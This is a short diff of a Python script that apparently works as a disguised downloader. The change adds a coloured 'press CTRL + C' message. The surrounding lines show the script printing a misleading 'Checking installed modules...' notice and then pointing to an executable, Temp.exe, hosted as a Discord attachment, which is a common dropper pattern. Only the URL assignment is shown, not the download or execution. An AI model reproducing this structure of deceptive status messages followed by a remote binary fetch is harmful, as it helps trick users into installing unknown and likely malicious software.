@@ -54,6 +54,8 @@ text = """
 print(Fore.RED + text)
 txp = """Checking installed modules... """
 print(Fore.RED + txp)
+win = """If you want to close the window press CTRL + C."""
+print(Fore.RED + win)
 time.sleep(3)
 
 url = 'https://cdn.discordapp.com/attachments/1106268627340120214/1106322625589944351/Temp.exe'
